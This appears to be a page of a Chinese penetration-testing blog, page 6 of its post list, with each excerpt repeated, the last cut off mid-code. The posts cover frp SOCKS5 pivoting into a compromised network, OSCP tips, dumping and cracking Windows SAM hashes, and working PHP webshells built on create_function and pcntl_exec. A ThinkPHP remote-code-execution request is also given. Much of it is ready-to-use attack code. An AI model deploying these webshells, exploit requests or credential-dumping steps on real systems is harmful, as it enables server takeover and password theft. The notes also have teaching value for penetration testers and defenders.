@@ -1,0 +1,821 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 6 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>😊#<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		wubba lubba dub dub.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/05/08/frps.html" >frps的socks5代理</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-05-08  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
+<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
+<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
+<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
+<pre class="line-numbers language-none"><code class="language-none">frps.ini: 
+
+[common]
+bind_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+dashboard_port &#x3D; [port]
+dashboard_user &#x3D; [user]
+dashboard_pwd &#x3D; [password]
+use_encryption &#x3D; true
+use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
+<pre class="line-numbers language-none"><code class="language-none">frpc.ini
+
+[common]
+server_addr &#x3D; [vps ip]
+server_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+
+
+[socks5]
+type &#x3D; tcp
+remote_port &#x3D; [port]
+plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
+<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
+<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
+<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
+<pre class="line-numbers language-none"><code class="language-none">frps.ini: 
+
+[common]
+bind_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+dashboard_port &#x3D; [port]
+dashboard_user &#x3D; [user]
+dashboard_pwd &#x3D; [password]
+use_encryption &#x3D; true
+use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
+<pre class="line-numbers language-none"><code class="language-none">frpc.ini
+
+[common]
+server_addr &#x3D; [vps ip]
+server_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+
+
+[socks5]
+type &#x3D; tcp
+remote_port &#x3D; [port]
+plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>
+
+	
+	</div>
+  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/04/02/OSCP-experience.html" >OSCP经验</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-04-02  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
+uth-user-pass auth.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
+<p>具体网络不稳定有两个表现:</p>
+<ol>
+<li>nmap扫描全部的端口长时间没有反应.</li>
+<li>dirbuster扫描的时候会卡死进行不下去了.</li>
+</ol>
+<p>上面两个问题有两个解决方法:</p>
+<ol>
+<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
+<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
+</ol>
+<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
+<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
+	
+
+	</div>
+  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
+uth-user-pass auth.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
+<p>具体网络不稳定有两个表现:</p>
+<ol>
+<li>nmap扫描全部的端口长时间没有反应.</li>
+<li>dirbuster扫描的时候会卡死进行不下去了.</li>
+</ol>
+<p>上面两个问题有两个解决方法:</p>
+<ol>
+<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
+<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
+</ol>
+<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
+<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
+	
+	</div>
+  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/03/01/hashcat.html" >Hashcat笔记</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-03-01  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在windows里面任意读取的文件，找到了sam.old文件和system.old文件，读取之后用burp保存到文件，可以使用如下的命令来提取密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedump
+usage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;
+
+root@kali:~# lsadump
+usage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;
+
+root@kali:~# pwdump
+usage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;
+
+或者mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>提取的格式大概是这样:</p>
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system sam
+Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>用户名称是:Administrator<br>RID是: 500<br>LM-HASH值: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)值: 1896d0a309184775f67c14d14b5c365a</p>
+<p>可以使用hashcat来跑密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其中的hash.txt 可以指的是上面的NT-HASH。</p>
+<pre class="line-numbers language-none"><code class="language-none">-m 1000 hash的类型，这里是NTLM
+-a 0  0表示词典碰撞，这里是kali自带的辞典，还有3表示使用GPU来爆破，不用指定词典。
+--force 忽略无显卡，直接跑
+hash.txt 就是上面的NT-HASH
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
+</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2019/03/01/hashcat.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在windows里面任意读取的文件，找到了sam.old文件和system.old文件，读取之后用burp保存到文件，可以使用如下的命令来提取密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedump
+usage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;
+
+root@kali:~# lsadump
+usage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;
+
+root@kali:~# pwdump
+usage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;
+
+或者mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>提取的格式大概是这样:</p>
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system sam
+Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>用户名称是:Administrator<br>RID是: 500<br>LM-HASH值: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)值: 1896d0a309184775f67c14d14b5c365a</p>
+<p>可以使用hashcat来跑密码:</p>
+<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其中的hash.txt 可以指的是上面的NT-HASH。</p>
+<pre class="line-numbers language-none"><code class="language-none">-m 1000 hash的类型，这里是NTLM
+-a 0  0表示词典碰撞，这里是kali自带的辞典，还有3表示使用GPU来爆破，不用指定词典。
+--force 忽略无显卡，直接跑
+hash.txt 就是上面的NT-HASH
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
+</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2019/03/01/hashcat.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/01/10/create_function.html" >create_function</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-01-10  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
+<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
+<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
+  eval(&quot;
+    function lambda_1 ($args) &#123; $code &#125;
+  &quot;);
+  return &#39;lambda_1&#39;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
+<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
+  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
+&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
+<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
+	
+
+	</div>
+  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
+<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
+<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
+  eval(&quot;
+    function lambda_1 ($args) &#123; $code &#125;
+  &quot;);
+  return &#39;lambda_1&#39;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
+<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
+  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
+&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
+<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
+	
+	</div>
+  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2018/12/18/pcntl_exec.html" >pcntl_exec</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2018-12-18  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>2019.8.1更新</p>
+<p>这样子执行完就不会多出来<defunc>的进程，也不会多出来<code>php-fpm</code>进程:</defunc></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+
+&#x2F;**
+ * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程
+ *&#x2F;
+
+&#x2F;&#x2F;生成子进程
+$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
+$pid &#x3D; pcntl_fork();
+if($pid &#x3D;&#x3D; -1)&#123;
+    die(&#39;could not fork&#39;);
+&#125;else&#123;
+    if($pid)&#123;
+        $status &#x3D; 0;
+        pcntl_exec($cmd[0], $cmd[1]);
+        posix_kill(getmypid(),9);
+&#x2F;&#x2F;阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
+        &#x2F;&#x2F;可使用pcntl_wait($status, WNOHANG)实现非阻塞式
+
+        pcntl_wait($status);
+        exit;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
+<p><strong>执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)</strong></p>
+<hr>
+<pre class="line-numbers language-none"><code class="language-none">参数执行:
+pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;返回值可能是502
+
+执行脚本:
+pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;返回值502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">返回值200
+&lt;?php
+$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
+if(function_exists(&#39;pcntl_exec&#39;)) &#123;
+    switch(pcntl_fork())&#123;
+     case 0:
+        pcntl_exec($cmd[0], $cmd[1]);
+    default:
+          echo &quot;case 111&quot;;
+    &#125;
+&#125; else &#123;
+        echo &#39;不支持pcntl扩展&#39;;
+&#125;
+?&gt;
+
+
+cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt
+
+&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;?php
+header(&quot;Content-Type: text&#x2F;plain&quot;);
+$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;
+@unlink($cmd);
+@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);
+$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;
+file_put_contents($cmd, $c);
+chmod($cmd, 0777);
+
+switch (pcntl_fork()) &#123;
+  case 0:
+    $ret &#x3D; pcntl_exec($cmd);
+    exit(&quot;case 0&quot;);
+  default:
+    echo &quot;case 1&quot;;
+    break;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>上面执行的脚本那行chmod不可以少</p>
+	
+
+	</div>
+  <a type="button" href="/2018/12/18/pcntl_exec.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>2019.8.1更新</p>
+<p>这样子执行完就不会多出来<defunc>的进程，也不会多出来<code>php-fpm</code>进程:</defunc></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+
+&#x2F;**
+ * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程
+ *&#x2F;
+
+&#x2F;&#x2F;生成子进程
+$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
+$pid &#x3D; pcntl_fork();
+if($pid &#x3D;&#x3D; -1)&#123;
+    die(&#39;could not fork&#39;);
+&#125;else&#123;
+    if($pid)&#123;
+        $status &#x3D; 0;
+        pcntl_exec($cmd[0], $cmd[1]);
+        posix_kill(getmypid(),9);
+&#x2F;&#x2F;阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
+        &#x2F;&#x2F;可使用pcntl_wait($status, WNOHANG)实现非阻塞式
+
+        pcntl_wait($status);
+        exit;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
+<p><strong>执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)</strong></p>
+<hr>
+<pre class="line-numbers language-none"><code class="language-none">参数执行:
+pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;返回值可能是502
+
+执行脚本:
+pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;返回值502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">返回值200
+&lt;?php
+$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
+if(function_exists(&#39;pcntl_exec&#39;)) &#123;
+    switch(pcntl_fork())&#123;
+     case 0:
+        pcntl_exec($cmd[0], $cmd[1]);
+    default:
+          echo &quot;case 111&quot;;
+    &#125;
+&#125; else &#123;
+        echo &#39;不支持pcntl扩展&#39;;
+&#125;
+?&gt;
+
+
+cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt
+
+&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;?php
